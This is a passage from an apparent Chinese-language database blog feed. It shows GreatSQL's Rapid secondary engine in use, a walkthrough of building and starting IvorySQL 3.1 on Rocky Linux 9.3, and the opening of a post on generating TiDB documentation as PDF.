<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; INSTALL PLUGIN Rapid SONAME &#x27;ha_rapid.so&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br></pre></td></tr></table></figure></div>
<p>再次查看相关系统变量，可以看到有 5 条记录。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%rapid%&#x27;;</span><br><span class="line">+-------------------------------+-----------------+</span><br><span class="line">| Variable_name                 | Value           |</span><br><span class="line">+-------------------------------+-----------------+</span><br><span class="line">| rapid_checkpoint_threshold    | 16777216        |</span><br><span class="line">| rapid_hash_table_memory_limit | 10              |</span><br><span class="line">| rapid_memory_limit            | 1073741824      |</span><br><span class="line">| rapid_temp_directory          | duckdb.data.tmp |</span><br><span class="line">| rapid_worker_threads          | 4               |</span><br><span class="line">+-------------------------------+-----------------+</span><br><span class="line">5 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure></div>
<p>查看 Rapid 插件信息。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show plugins;</span><br><span class="line">+----------------------------------+----------+--------------------+-------------+---------+</span><br><span class="line">| Name                             | Status   | Type               | Library     | License |</span><br><span class="line">+----------------------------------+----------+--------------------+-------------+---------+</span><br><span class="line">...</span><br><span class="line">| Rapid                            | ACTIVE   | STORAGE ENGINE     | ha_rapid.so | GPL     |</span><br><span class="line">+----------------------------------+----------+--------------------+-------------+---------+</span><br><span class="line">51 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from information_schema.plugins where PLUGIN_NAME = &#x27;rapid&#x27;\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           PLUGIN_NAME: Rapid</span><br><span class="line">        PLUGIN_VERSION: 0.1</span><br><span class="line">         PLUGIN_STATUS: ACTIVE</span><br><span class="line">           PLUGIN_TYPE: STORAGE ENGINE</span><br><span class="line">   PLUGIN_TYPE_VERSION: 80032.0</span><br><span class="line">        PLUGIN_LIBRARY: ha_rapid.so</span><br><span class="line">PLUGIN_LIBRARY_VERSION: 1.11</span><br><span class="line">         PLUGIN_AUTHOR: Oracle Corporation</span><br><span class="line">    PLUGIN_DESCRIPTION: Rapid storage engine</span><br><span class="line">        PLUGIN_LICENSE: GPL</span><br><span class="line">           LOAD_OPTION: ON</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="8-启用-Rapid-引擎，并加载数据">8. 启用 Rapid 引擎，并加载数据</h3>
<p>创建一个测试表，默认存储引擎为 InnoDB。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show create table t\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: t</span><br><span class="line">Create Table: CREATE TABLE `t` (</span><br><span class="line">  `a` int DEFAULT NULL</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>将该表的第二存储设置为 Rapid。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter table t secondary_engine = rapid;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; show create table t\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: t</span><br><span class="line">Create Table: CREATE TABLE `t` (</span><br><span class="line">  `a` int DEFAULT NULL</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci SECONDARY_ENGINE=rapid</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>查看表结构，描述里出现 <code>SECONDARY_ENGINE=rapid</code> 字样。</p>
<p>也可以通过参数 <code>show_create_table_skip_secondary_engine</code> 进行控制展示内容，跳过第二引擎展示。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; set show_create_table_skip_secondary_engine = on;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show create table t\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: t</span><br><span class="line">Create Table: CREATE TABLE `t` (</span><br><span class="line">  `a` int DEFAULT NULL</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>加载数据到 Rapid 引擎。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter table t secondary_load;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是，需要先进行 load 再查询数据，否则会报错。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain analyze select /*+ set_var(use_secondary_engine=forced) */ * from t\G</span><br><span class="line">ERROR 3889 (HY000): Secondary engine operation failed. use_secondary_engine is FORCED but query could not be executed in secondary engine.</span><br></pre></td></tr></table></figure></div>
<h3 id="9-Rapid-的使用">9. Rapid 的使用</h3>
<p>使用 Hint 强制使用 Rapid 引擎，并查看执行计划。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select /*+ set_var(use_secondary_engine=forced) */ * from t;</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+------------------------------+</span><br><span class="line">| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra                        |</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+------------------------------+</span><br><span class="line">|  1 | SIMPLE      | t     | NULL       | ALL  | NULL          | NULL | NULL    | NULL |    1 |   100.00 | Using secondary engine RAPID |</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+------------------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">Note (Code 1003): /* select#1 */ select /*+ SET_VAR(use_secondary_engine=&#x27;forced&#x27;) */ `sbtest`.`t`.`a` AS `a` from `sbtest`.`t`</span><br></pre></td></tr></table></figure></div>
<p>不过，目前不支持 <code>explain analyze</code> 语法。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain analyze select /*+ set_var(use_secondary_engine=forced) */ * from t;</span><br><span class="line">ERROR 1235 (42000): This version of MySQL doesn&#x27;t yet support &#x27;EXPLAIN ANALYZE with secondary engine&#x27;</span><br></pre></td></tr></table></figure></div>
<p>在<a class="link"   href="https://greatsql.cn/docs/8032-25/user-manual/5-enhance/5-1-highperf-rapid-engine.html" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中，还有描述了一些限制：</p>
<blockquote>
<p>在GreatSQL 8.0.32-25版本中，Rapid引擎支持的语句范围如下：</p>
<ol>
<li>表类型：InnoDB引擎的normal表。</li>
<li>SELECT stmt：不包含 SELECT INTO, SELECT locking clause 等语法。</li>
<li>PREPARE stmt：仅支持 PREPARE SELECT查询。</li>
</ol>
<p>其余类型的SQL语法暂时还不支持。</p>
<p>Rapid引擎暂时不支持表分区（partition），不支持外键（foreign key）。</p>
</blockquote>
<p>举例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE partitioned_table (</span><br><span class="line">    -&gt;     id INT,</span><br><span class="line">    -&gt;     name VARCHAR(50),</span><br><span class="line">    -&gt;     date_created DATE</span><br><span class="line">    -&gt; )</span><br><span class="line">    -&gt; PARTITION BY RANGE (YEAR(date_created)) (</span><br><span class="line">    -&gt;     PARTITION p0 VALUES LESS THAN (1991),</span><br><span class="line">    -&gt;     PARTITION p1 VALUES LESS THAN (1992)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; alter table partitioned_table secondary_engine = rapid;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; alter table partitioned_table secondary_load;</span><br><span class="line">ERROR 3877 (HY000): The partition table is not supported for RAPID</span><br></pre></td></tr></table></figure></div>
<p>此外，也不支持整个库同时加载到 Rapid 引擎。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter database sbtest secondary_engine = rapid;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;secondary_engine = rapid&#x27; at line 1</span><br></pre></td></tr></table></figure></div>
<h3 id="10-查看-Rapid-引擎表的系统信息">10. 查看 Rapid 引擎表的系统信息</h3>
<p>在系统表中可以查看到 Rapid 相关信息，具体示例如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select TABLE_NAME,ENGINE,CREATE_OPTIONS from information_schema.tables where TABLE_SCHEMA = &#x27;sbtest&#x27;;</span><br><span class="line">+-------------------+--------+---------------------------------------------------------+</span><br><span class="line">| TABLE_NAME        | ENGINE | CREATE_OPTIONS                                          |</span><br><span class="line">+-------------------+--------+---------------------------------------------------------+</span><br><span class="line">| partitioned_table | InnoDB | partitioned SECONDARY_ENGINE=&quot;rapid&quot; SECONDARY_LOAD=&quot;0&quot; |</span><br><span class="line">| t                 | InnoDB | SECONDARY_ENGINE=&quot;rapid&quot; SECONDARY_LOAD=&quot;1&quot;             |</span><br><span class="line">+-------------------+--------+---------------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc information_schema.SECONDARY_ENGINE_INCREMENT_LOAD_TASK;</span><br><span class="line">+--------------------+----------------+------+-----+---------+-------+</span><br><span class="line">| Field              | Type           | Null | Key | Default | Extra |</span><br><span class="line">+--------------------+----------------+------+-----+---------+-------+</span><br><span class="line">| DB_NAME            | varchar(192)   | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME         | varchar(192)   | NO   |     |         |       |</span><br><span class="line">| START_TIME         | varchar(192)   | NO   |     |         |       |</span><br><span class="line">| START_GTID         | varchar(65535) | NO   |     |         |       |</span><br><span class="line">| COMMITTED_GTID_SET | varchar(65535) | NO   |     |         |       |</span><br><span class="line">| READ_GTID          | varchar(192)   | NO   |     |         |       |</span><br><span class="line">| READ_BINLOG_FILE   | varchar(1024)  | NO   |     |         |       |</span><br><span class="line">| READ_BINLOG_POS    | bigint         | NO   |     |         |       |</span><br><span class="line">| DELAY              | bigint         | NO   |     |         |       |</span><br><span class="line">| STATUS             | varchar(192)   | NO   |     |         |       |</span><br><span class="line">| END_TIME           | varchar(192)   | NO   |     |         |       |</span><br><span class="line">| INFO               | varchar(1024)  | NO   |     |         |       |</span><br><span class="line">+--------------------+----------------+------+-----+---------+-------+</span><br><span class="line">12 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>GreatSQL 于 2/4 正式推出 AP 引擎 Rapid，并提供下载试用。本文简要介绍了如何安装 GreatSQL，及 Rapid 引擎的基础用法。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
]]></content>
      <categories>
        <category>GreatSQL</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>percona</tag>
        <tag>greatsql</tag>
      </tags>
  </entry>
  <entry>
    <title>🎉好消息！IvorySQL 库回归啦~</title>
    <url>/2024/postgresql/ivorysql-3.1-released/</url>
    <content><![CDATA[<img  alt="ivorysql.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240207-d856ff9f-5e9e-474b-b5c0-0ff3718eb5c8.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="IvorySQL-3-1-发版">IvorySQL 3.1 发版</h2>
<p>先让我们来回一下时间线：</p>
<ul>
<li>
<p>PostgreSQL 16</p>
<ul>
<li>2023-09-14, PostgreSQL 16.0 Released</li>
<li>2023-11-09, PostgreSQL 16.1 Released</li>
</ul>
</li>
<li>
<p>IvorySQL 3</p>
<ul>
<li>2023-11-17, IvorySQL 3.0 Released</li>
<li>2024-01-26, IvorySQL 3.1 Released</li>
</ul>
</li>
</ul>
<p>再来看下 IvorySQL 3.2 的发版说明：</p>
<ol>
<li>
<p>版本介绍</p>
<p>[发行日期：2024年1月26日]</p>
<p>IvorySQL 3.1 基于 PostgreSQL 16.1 ，包含来自 PostgreSQL 16.1 的各种修复。有关 PostgreSQL 16.1 中更详细的更新和错误修复，请参阅官方 PostgreSQL 16.1 发行说明 。</p>
</li>
<li>
<p>已知问题</p>
<p>暂无</p>
</li>
<li>
<p>增强功能</p>
<p>暂无</p>
</li>
<li>
<p>问题修复</p>
<p>暂无</p>
</li>
<li>
<p>源代码</p>
<p>IvorySQL主要包含2个代码仓库，数据库IvorySQL代码仓、IvorySQL网站仓：</p>
<ul>
<li>IvorySQL代码仓： <a class="link"   href="https://github.com/IvorySQL/IvorySQL" >https://github.com/IvorySQL/IvorySQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>IvorySQL网站仓： <a class="link"   href="https://github.com/IvorySQL/Ivory-www" >https://github.com/IvorySQL/Ivory-www <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
</li>
<li>
<p>贡献人员</p>
<p>以下个人作为补丁作者、提交者、审阅者、测试者或问题报告者为本版本做出了贡献。</p>
<ul>
<li>Grant Zhou</li>
<li>矫顺田</li>
<li>牛世继</li>
<li>梁翔宇</li>
<li>高雪玉</li>
<li>Cary Huang</li>
<li>David Zhang</li>
<li>谭洋</li>
<li>王杰</li>
<li>穆帅楠</li>
<li>张洪源</li>
<li>王守波</li>
<li>任娇</li>
<li>刘政</li>
<li>肖哲凯</li>
<li>金华建</li>
<li>王丽</li>
<li>尚雷</li>
<li>冯磊</li>
<li>宋金周</li>
<li>Leo X.M. Zeng</li>
<li>严少安</li>
<li>M.Imran Zaheer</li>
<li>Yunhe Xu</li>
<li>王皓</li>
<li>董小姐</li>
<li>韩伟博</li>
</ul>
</li>
</ol>
<h2 id="IvorySQL-3-1-编译安装">IvorySQL 3.1 编译安装</h2>
<p>之前介绍过 IvorySQL 2.x/3.0 的编译安装，3.1 和 3.0 的步骤基本一致。</p>
<p>只是，这次的编译环境是在 Rocky Linux 9.3 上运行的 Rocky Linux 9.3 容器中。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@shawnyan ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.3 (Blue Onyx)</span><br><span class="line">[mysql@shawnyan ~]$ podman images</span><br><span class="line">REPOSITORY                    TAG         IMAGE ID      CREATED       SIZE</span><br><span class="line">shawnyan.cn/rl9-builder       latest      9e887e48ed6c  4 hours ago   297 MB</span><br><span class="line">shawnyan.cn/rl9-systemd       latest      be8b85ec9c17  4 hours ago   205 MB</span><br><span class="line">docker.io/library/rockylinux  9.3         b72d2d915008  2 months ago  181 MB</span><br><span class="line">[mysql@shawnyan ~]$ podman ps</span><br><span class="line">CONTAINER ID  IMAGE                               COMMAND               CREATED       STATUS       PORTS       NAMES</span><br><span class="line">b1547a08c6a1  shawnyan.cn/rl9-builder:latest      /usr/lib/systemd/...  3 hours ago   Up 3 hours               shawnyan</span><br><span class="line">[mysql@shawnyan ~]$ podman exec -it shawnyan bash</span><br><span class="line">[root@shawnyan /]#</span><br><span class="line">[root@shawnyan /]# cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.3 (Blue Onyx)</span><br><span class="line">[root@shawnyan /]# uname -a</span><br><span class="line">Linux shawnyan 5.14.0-362.13.1.el9_3.x86_64 #1 SMP PREEMPT_DYNAMIC Wed Dec 13 14:07:45 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[root@shawnyan /]# gcc --version</span><br><span class="line">gcc (GCC) 11.4.1 20230605 (Red Hat 11.4.1-2)</span><br><span class="line">Copyright (C) 2021 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure></div>
<p>编译步骤也很简单，下面是主要步骤：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">export IVORY_VERSION=3.1</span><br><span class="line">wget https://github.com/IvorySQL/IvorySQL/archive/refs/tags/IvorySQL_$IVORY_VERSION.tar.gz</span><br><span class="line">tar zxf IvorySQL_$IVORY_VERSION.tar.gz</span><br><span class="line">cd IvorySQL-IvorySQL_$IVORY_VERSION</span><br><span class="line">./configure --prefix=/opt/ivorysql-$IVORY_VERSION --with-extra-version=&quot;-ShawnYan&quot;</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></div>
<p>编译完成后，进行数据目录初始化：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">initdb</span><br></pre></td></tr></table></figure></div>
<p>输出结果如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan /]# cd /data/ivorysql-3.1/</span><br><span class="line">[root@shawnyan ivorysql-3.1]# ls -al</span><br><span class="line">total 68</span><br><span class="line">drwx------ 19 ivorysql ivorysql  4096 Feb  2 07:35 .</span><br><span class="line">drwxr-xr-x  4 ivorysql ivorysql    46 Feb  2 07:40 ..</span><br><span class="line">-rw-------  1 ivorysql ivorysql     3 Feb  2 07:17 PG_VERSION</span><br><span class="line">drwx------  6 ivorysql ivorysql    46 Feb  2 07:17 base</span><br><span class="line">drwx------  2 ivorysql ivorysql  4096 Feb  2 07:29 global</span><br><span class="line">-rw-------  1 ivorysql ivorysql   718 Feb  2 07:17 ivorysql.conf</span><br><span class="line">drwx------  2 ivorysql ivorysql     6 Feb  2 07:17 pg_commit_ts</span><br><span class="line">drwx------  2 ivorysql ivorysql     6 Feb  2 07:17 pg_dynshmem</span><br><span class="line">-rw-------  1 ivorysql ivorysql  5779 Feb  2 07:19 pg_hba.conf</span><br><span class="line">-rw-------  1 ivorysql ivorysql  2640 Feb  2 07:17 pg_ident.conf</span><br><span class="line">drwx------  4 ivorysql ivorysql    68 Feb  2 07:35 pg_logical</span><br><span class="line">drwx------  4 ivorysql ivorysql    36 Feb  2 07:17 pg_multixact</span><br><span class="line">drwx------  2 ivorysql ivorysql     6 Feb  2 07:17 pg_notify</span><br><span class="line">drwx------  2 ivorysql ivorysql     6 Feb  2 07:17 pg_replslot</span><br><span class="line">drwx------  2 ivorysql ivorysql     6 Feb  2 07:17 pg_serial</span><br><span class="line">drwx------  2 ivorysql ivorysql     6 Feb  2 07:17 pg_snapshots</span><br><span class="line">drwx------  2 ivorysql ivorysql    25 Feb  2 07:35 pg_stat</span><br><span class="line">drwx------  2 ivorysql ivorysql     6 Feb  2 07:17 pg_stat_tmp</span><br><span class="line">drwx------  2 ivorysql ivorysql    18 Feb  2 07:17 pg_subtrans</span><br><span class="line">drwx------  2 ivorysql ivorysql     6 Feb  2 07:17 pg_tblspc</span><br><span class="line">drwx------  2 ivorysql ivorysql     6 Feb  2 07:17 pg_twophase</span><br><span class="line">drwx------  3 ivorysql ivorysql    92 Feb  2 07:23 pg_wal</span><br><span class="line">drwx------  2 ivorysql ivorysql    18 Feb  2 07:17 pg_xact</span><br><span class="line">-rw-------  1 ivorysql ivorysql    88 Feb  2 07:17 postgresql.auto.conf</span><br><span class="line">-rw-------  1 ivorysql ivorysql 29841 Feb  2 07:18 postgresql.conf</span><br><span class="line">-rw-------  1 ivorysql ivorysql    31 Feb  2 07:23 postmaster.opts</span><br><span class="line">[root@shawnyan ivorysql-3.1]#</span><br></pre></td></tr></table></figure></div>
<p>启动数据库：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ivorysql@shawnyan ~]$ pg_ctl start</span><br><span class="line">waiting for server to start....2024-02-02 07:23:37.656 UTC [11422] LOG:  starting PostgreSQL 16.1-ShawnYan (IvorySQL 3.1) on x86_64-pc-linux-gnu, compiled by gcc (GCC) 11.4.1 20230605 (Red Hat 11.4.1-2), 64-bit</span><br><span class="line">2024-02-02 07:23:37.656 UTC [11422] LOG:  listening on IPv4 address &quot;0.0.0.0&quot;, port 5432</span><br><span class="line">2024-02-02 07:23:37.656 UTC [11422] LOG:  listening on IPv6 address &quot;::&quot;, port 5432</span><br><span class="line">2024-02-02 07:23:37.661 UTC [11422] LOG:  listening on IPv6 address &quot;::1&quot;, port 1521</span><br><span class="line">2024-02-02 07:23:37.661 UTC [11422] LOG:  listening on IPv4 address &quot;127.0.0.1&quot;, port 1521</span><br><span class="line">2024-02-02 07:23:37.661 UTC [11422] LOG:  listening on Unix socket &quot;/tmp/.s.PGSQL.5432&quot;</span><br><span class="line">2024-02-02 07:23:37.665 UTC [11422] LOG:  listening on Unix socket &quot;/tmp/.s.PGSQL.1521&quot;</span><br><span class="line">2024-02-02 07:23:37.676 UTC [11425] LOG:  database system was shut down at 2024-02-02 07:23:30 UTC</span><br><span class="line">2024-02-02 07:23:37.681 UTC [11422] LOG:  database system is ready to accept connections</span><br><span class="line"> done</span><br><span class="line">server started</span><br></pre></td></tr></table></figure></div>
<p>连接 IvorySQL 数据库：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ivorysql@shawnyan ~]$ psql</span><br><span class="line">psql (16.1-ShawnYan)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">ivorysql=# \l</span><br><span class="line">                                                   List of databases</span><br><span class="line">   Name    |  Owner   | Encoding | Locale Provider | Collate |  Ctype  | ICU Locale | ICU Rules |   Access privileges</span><br><span class="line">-----------+----------+----------+-----------------+---------+---------+------------+-----------+-----------------------</span><br><span class="line"> ivorysql  | ivorysql | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           |</span><br><span class="line"> postgres  | ivorysql | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           |</span><br><span class="line"> template0 | ivorysql | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           | =c/ivorysql          +</span><br><span class="line">           |          |          |                 |         |         |            |           | ivorysql=CTc/ivorysql</span><br><span class="line"> template1 | ivorysql | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           | =c/ivorysql          +</span><br><span class="line">           |          |          |                 |         |         |            |           | ivorysql=CTc/ivorysql</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br><span class="line">ivorysql=# select version();</span><br><span class="line">                                                             version</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL 16.1-ShawnYan (IvorySQL 3.1) on x86_64-pc-linux-gnu, compiled by gcc (GCC) 11.4.1 20230605 (Red Hat 11.4.1-2), 64-bit</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">ivorysql=#</span><br></pre></td></tr></table></figure></div>
<p><strong>惊喜</strong>的是，在 IvorySQL 3.0 中，已经被移除的 <strong><code>ivorysql</code></strong> 库又重新加回来了。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ivorysql@shawnyan ivorysql-3.0]$ psql</span><br><span class="line">2024-02-02 07:42:30.310 UTC [20979] FATAL:  database &quot;ivorysql&quot; does not exist</span><br><span class="line">psql: error: connection to server on socket &quot;/tmp/.s.PGSQL.5432&quot; failed: FATAL:  database &quot;ivorysql&quot; does not exist</span><br><span class="line">[ivorysql@shawnyan ivorysql-3.0]$ createdb ivorysql</span><br><span class="line">[ivorysql@shawnyan ivorysql-3.0]$ psql</span><br><span class="line">psql (16.0-ShawnYan)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">ivorysql=# \l</span><br><span class="line">                                                   List of databases</span><br><span class="line">   Name    |  Owner   | Encoding | Locale Provider | Collate |  Ctype  | ICU Locale | ICU Rules |   Access privileges</span><br><span class="line">-----------+----------+----------+-----------------+---------+---------+------------+-----------+-----------------------</span><br><span class="line"> ivorysql  | ivorysql | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           |</span><br><span class="line"> postgres  | ivorysql | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           |</span><br><span class="line"> template0 | ivorysql | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           | =c/ivorysql          +</span><br><span class="line">           |          |          |                 |         |         |            |           | ivorysql=CTc/ivorysql</span><br><span class="line"> template1 | ivorysql | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           | =c/ivorysql          +</span><br><span class="line">           |          |          |                 |         |         |            |           | ivorysql=CTc/ivorysql</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br><span class="line">ivorysql=# </span><br></pre></td></tr></table></figure></div>
<p>到此，IvorySQL 3.1 已安装完成，并顺利启动。</p>
<p>另外，需要注意的是，由于 IvorySQL 3 支持双端口策略，所以可以在 <code>postgresql.conf</code> 文件中配置 pg 模式的监听地址，以及在 <code>ivorysql.conf</code> 文件中配置 ora 模式的监听地址，默认为 <code>localhost</code>，这里改为 <code>*</code> 监听所有地址。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ivorysql-3.1]# grep listen_addr postgresql.conf</span><br><span class="line">listen_addresses = &#x27;*&#x27;</span><br><span class="line">[root@shawnyan ivorysql-3.1]# grep listen_addr ivorysql.conf</span><br><span class="line">ivorysql.listen_addresses = &#x27;*&#x27;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ivorysql@shawnyan ~]$ ss -antpl</span><br><span class="line">State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process</span><br><span class="line">LISTEN   0        200              0.0.0.0:5432          0.0.0.0:*      users:((&quot;postgres&quot;,pid=21040,fd=6))</span><br><span class="line">LISTEN   0        200              0.0.0.0:1521          0.0.0.0:*      users:((&quot;postgres&quot;,pid=21040,fd=8))</span><br><span class="line">LISTEN   0        200                 [::]:5432             [::]:*      users:((&quot;postgres&quot;,pid=21040,fd=7))</span><br><span class="line">LISTEN   0        200                 [::]:1521             [::]:*      users:((&quot;postgres&quot;,pid=21040,fd=9))</span><br><span class="line">[ivorysql@shawnyan ~]$</span><br></pre></td></tr></table></figure></div>
<p>OK, 简单做个小结，IvorySQL 3.1 是 IvorySQL 3.x 系列在 2024 年发布的第一个版本，支持 pg/ora 双模式双端口，合并了若干 PostgreSQL 16.1 中修复的问题，并将 IvorySQL 3.0 中移除的 <code>ivorysql</code> 库重新加回。</p>
<h2 id="相关阅读">相关阅读</h2>
<ul>
<li><a href="https://shawnyan.cn/2023/postgresql/ivorysql-v3.0-feature/">IvorySQL v3.0 新特性浅测</a></li>
<li><a href="https://shawnyan.cn/2023/postgresql/ivorysql-v2.3-feature/">象牙数据库 IvorySQL v2.3 特性浅析</a></li>
</ul>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>IvorySQL</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>ivorysql</tag>
        <tag>highgo</tag>
        <tag>postgresql 16</tag>
      </tags>
  </entry>
  <entry>
    <title>浅尝在 Rocky 9 下自助生成 PDF 格式的 TiDB 文档</title>
    <url>/2024/tidb/tidb-docs-gen-pdf/</url>
    <content><![CDATA[<img  alt="img1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240108-dfb9b292-6804-4902-a0b4-55ffede33402.png"
                      referrerpolicy="no-referrer"
                >
<blockquote>
<p>图片选自: <a class="link"   href="https://asktug.com/t/topic/1020117" >https://asktug.com/t/topic/1020117 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h2 id="TL-DR">TL;DR</h2>
